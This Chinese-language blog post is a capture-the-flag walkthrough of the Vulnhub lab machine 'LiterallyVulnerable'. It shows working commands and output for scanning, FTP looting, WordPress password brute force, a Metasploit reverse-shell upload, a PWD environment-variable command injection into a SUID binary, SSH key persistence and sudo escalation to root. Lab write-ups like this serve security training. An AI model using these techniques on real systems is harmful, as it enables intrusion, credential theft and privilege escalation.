---
layout: post
title: "LiterallyVulnerable walkthrough"
date: 2021-10-03
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机               | IP                |
| -------------------- | ----------------- |
| 本机（Win10）        | `192.168.174.1`   |
| Kali                 | `192.168.174.128` |
| Literally Vulnerable | `192.168.174.131` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.131`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.131                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 01:02 EDT
Nmap scan report for 192.168.174.131
Host is up (0.00043s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           325 Dec 04  2019 backupPasswords
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.174.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)
|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)
|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)
80/tcp    open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: WordPress 5.3
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Not so Vulnerable &#8211; Just another WordPress site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:E8:09:44 (VMware)
```

在访问网页前，添加`192.168.174.131 literally.vulnerable`在 `/etc/hosts` 文件结尾，这样网页才能正常显示。根据扫描结果，我们可以知道**80**端口下使用的是 wordpress ，那么可以使用 *wpscan* 工具进行探测。此外**65535**端口显示的是 apache 的默认界面，该目录下可能存在其他路径。

既然web方面没什么进展，那么我们就看看 ftp 服务器上的内容，匿名登录到服务器后下载*backupPasswords* 文件到本地。

```shell
┌──(root💀kali)-[~]
└─# ftp 192.168.174.131                      
Connected to 192.168.174.131.
220 (vsFTPd 3.0.3)
Name (192.168.174.131:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           325 Dec 04  2019 backupPasswords
226 Directory send OK.
ftp> get backupPasswords /root/backupPasswords
local: /root/backupPasswords remote: backupPasswords
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backupPasswords (325 bytes).
226 Transfer complete.
325 bytes received in 0.27 secs (1.1588 kB/s)
ftp> quit
221 Goodbye.
```

查看文件内容，至此得到了密码字典文件。

```
Hi Doe, 

I'm guessing you forgot your password again! I've added a bunch of passwords below along with your password so we don't get hacked by those elites again!

*$eGRIf7v38s&p7
yP$*SV09YOrx7mY
GmceC&oOBtbnFCH
3!IZguT2piU8X$c
P&s%F1D4#KDBSeS
$EPid%J2L9LufO5
nD!mb*aHON&76&G
$*Ke7q2ko3tqoZo
SCb$I^gDDqE34fA
Ae%tM0XIWUMsCLp
```

### 登录密码爆破

尝试对**80**端口下的 wordpress 进行登录密码爆破，或者ssh登录爆破都没有结果。既然都走不通了，那么在**65535**端口上下文章吧。。。

使用 *ffuf* 进行目录枚举，发现存在 */phpcms* 路径。

```shell
┌──(root💀kali)-[~]
└─# ffuf -u http://192.168.174.131:65535/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50                

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.174.131:65535/FUZZ
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

javascript              [Status: 301, Size: 332, Words: 20, Lines: 10]
phpcms                  [Status: 301, Size: 328, Words: 20, Lines: 10]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
:: Progress: [62283/62283] :: Job [1/1] :: 19945 req/sec :: Duration: [0:00:03] :: Errors: 3 ::
```

访问该路径发现也是用的 wordpress 框架，那么用 *wpscan* 工具一把嗦，发现存在两个用户：`notadmin`、`maybeadmin`

```shell
┌──(root💀kali)-[~]
└─# wpscan --url http://192.168.174.131:65535/phpcms/ -e u                           
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.174.131:65535/phpcms/ [192.168.174.131]
[+] Started: Sun Oct  3 02:39:05 2021

......

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] maybeadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

目前为止我们得到了两个用户名和一个密码字典，下一步显而易见就是账号密码爆破，爆破后得到正确用户名和密码：`maybeadmin:$EPid%J2L9LufO5`

```shell
──(root💀kali)-[~]
└─# wpscan --url http://192.168.174.131:65535/phpcms/ -U maybeadmin -P backupPasswords.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.174.131:65535/phpcms/ [192.168.174.131]
[+] Started: Sun Oct  3 02:40:25 2021

......

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <======================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - maybeadmin / $EPid%J2L9LufO5                                                                                                             
Trying maybeadmin / Ae%tM0XIWUMsCLp Time: 00:00:00 <================================                                > (10 / 20) 50.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: maybeadmin, Password: $EPid%J2L9LufO5

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

使用该用户名和密码登录到后台，在发布的 *secure post* 内容中得到另一个用户名和密码：`notadmin:Pa$$w0rd13!&`，并且该账户是管理员角色。

![1]({{ '/literally/1.png' | prepend: site.url }})

### Getshell

在**Theme Editor** 编辑php文件保存时，出现：`Unable to communicate back with site to check for fatal errors, so the  PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.`错误，修复挺麻烦的。那么我们选择使用 MSF 框架里的脚本吧。

```shell
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 192.168.174.131
rhosts => 192.168.174.131
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /phpcms
targeturi => /phpcms
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rport 65535
rport => 65535
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username notadmin
username => notadmin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password Pa$$w0rd13!&
password => Pa$$w0rd13!&
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit 

[*] Started reverse TCP handler on 192.168.174.128:4444 
[*] Authenticating with WordPress using notadmin:Pa$$w0rd13!&...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /phpcms/wp-content/plugins/hTCeYURIiC/MkxSOpUHBp.php...
[*] Sending stage (39282 bytes) to 192.168.174.131
[+] Deleted MkxSOpUHBp.php
[+] Deleted hTCeYURIiC.php
[+] Deleted ../hTCeYURIiC
[*] Meterpreter session 1 opened (192.168.174.128:4444 -> 192.168.174.131:37822) at 2021-10-03 04:47:51 -0400

meterpreter > id
[-] Unknown command: id.
```

之后输入 `shell`命令进行交互，一番操作后可得知系统有两个用户：`doe`、`john`。在查看 `/home/doe/local.txt`文件时权限不足，那么下一步就需要提权。

### 提权

查看具有SUID权限的可执行文件时发现可疑文件：`/home/doe/itseasy`，执行后输出内容如下：

```shell
www-data@literallyvulnerable:/home/doe$ ./itseasy
./itseasy
Your Path is: /home/doe
```

可以大胆猜测该文件的功能是查看当前路径，不过为了保险起见，我们用IDA pro打开进行分析。

![2]({{ '/literally/2.png' | prepend: site.url }})

可以看到该程序是读取**PWD**环境变量，那么只要将shell添加到**PWD**环境变量里，就可以进行提权，详细操作如下：

```shell
www-data@literallyvulnerable:/home/doe$ export PWD=\$\(/bin/bash\)
export PWD=\$\(/bin/bash\)
www-data@literallyvulnerable:$(/bin/bash)$ ./itseasy    
./itseasy
john@literallyvulnerable:/home/doe$ id
id
john@literallyvulnerable:/home/doe$ whoami
whoami
john@literallyvulnerable:/home/doe$ ls
ls
john@literallyvulnerable:/home/doe$ ls -a
```

可以看到我们成功切换到 *john* 账户下，不过命令返回结果需要登出才能看到。为了后续操作方便，进行ssh免密登录配置。

1. kali 上执行 `ssh-keygen`生成密钥对
2. 靶机上将生成的 *id_rsa.pub* 公钥写入在`/home/doe/.ssh/authorized_keys`文件里
3. kali 远程免密登录到靶机

```shell
john@literallyvulnerable:/home/doe$ mkdir ~/.ssh
mkdir ~/.ssh
john@literallyvulnerable:/home/doe$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjDx3EgS15L3oTarF0SwdkthPndAUtFR0rJZysFdI+Uu8Na9pb1M0SQclqJNDTV5MH6pgC2kQ1JR/9qe6G3RR8dVNmCr28yrAigqiicsZPGo/yKSHVusgOEAeZFGM7oEhxdQ8IoVMvQvEhx3MbkRgBcgsPgDZyniTuoEpfnzfqM/hHjCP/P6oLKQ+TlGk/QdKHaQyR92udGIUeWoNslJ9RW9/ugJdG7izVOiNNwsRKANZPQnwvOvqkEjQQ+vtnA19Q0a/lwcx4AejU329+twQmhHmijmNOHOjwsELWjfiqkcCJjwiREpy8amgF/LIHW1hutb1i4ufOW+8aOPYW6BIiHhSfRPDKlEOg+OxaVKIxfZqlJxBX9pFLWxMI2Z7VAolKdf1YTZNeuOq6pbzUVyfudiq1cyXd+OIFOfNGV1yTQ8QT4x9zQ4gJQzvlQRMgGUnsdHMWIu60/QREEhK64qupLGrJBgAWQM2zFBi2RPxfixdd+2+GJp9xvKhFNJEnIHE= root@kali" > ~/.ssh/authorized_keys
<p9xvKhFNJEnIHE= root@kali" > ~/.ssh/authorized_keys
```

读取 `/home/john/user.txt` 文件得到第一个flag：

```shell
john@literallyvulnerable:~$ cat user.txt
Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;) 
Flag: iuz1498ne667ldqmfarfrky9v5ylki
```

在 `/home/john/.local/share/tmpFiles/myPassword`文件中得到 *john* 的账户密码：`YZW$s8Y49IB#ZZJ`

```shell
john@literallyvulnerable:~/.local/share/tmpFiles$ cat myPassword 
I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
am9objpZWlckczhZNDlJQiNaWko=
```

在执行 `sudo -l` 时输入密码得到结果：

```shell
john@literallyvulnerable:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on literallyvulnerable:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on literallyvulnerable:
    (root) /var/www/html/test.html
```

该账户可执行*root*账户下的 `/var/www/html/test.html` 命令，不过该目录只能*www-data*账户具有权限。因此切换到*www-data* 账户下即可，创建 *test.html*文件，写入内容：`/bin/bash`即可。

```shell
john@literallyvulnerable:/var/www/html$ ls
index.html  index.nginx-debian.html  phpcms  test.html
john@literallyvulnerable:/var/www/html$ sudo ./test.html
root@literallyvulnerable:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

至此我们得到了*root* 权限，查看 `/home/doe/local.txt` 文件得到第二个flag：

```shell
root@literallyvulnerable:/home/doe# cat local.txt
Congrats, you did it! I hope it was *easy* for you! Keep in mind #EEE is the way to go!
Flag: worjnp1jxh9iefqxrj2fkgdy3kpejp
```

查看 `/root/root.txt` 文件得到最后一个flag：

```shell
root@literallyvulnerable:/root# cat root.txt 
It was
 _     _ _                 _ _         _   _       _                      _     _      _ 
| |   (_) |               | | |       | | | |     | |                    | |   | |    | |
| |    _| |_ ___ _ __ __ _| | |_   _  | | | |_   _| |_ __   ___ _ __ __ _| |__ | | ___| |
| |   | | __/ _ \ '__/ _` | | | | | | | | | | | | | | '_ \ / _ \ '__/ _` | '_ \| |/ _ \ |
| |___| | ||  __/ | | (_| | | | |_| | \ \_/ / |_| | | | | |  __/ | | (_| | |_) | |  __/_|
\_____/_|\__\___|_|  \__,_|_|_|\__, |  \___/ \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|\___(_)
                                __/ |                                                    
                               |___/                                                     

Congrats, you did it! I hope it was *literally easy* for you! :) 
Flag: pabtejcnqisp6un0sbz0mrb3akaudk

Let me know, if you liked the machine @syed__umar
```

### 总结

1. 目录枚举使用字典：`seclists/Discovery/Web-Content/raft-large-directories.txt`
2. 环境变量写shell：`export PWD=\$\(/bin/bash\)`
3. 在 wordpress 后台写shell遇到困难时，选择 msf 下的脚本试试：`exploit/unix/webapp/wp_admin_shell_upload`
4. ssh免密登录

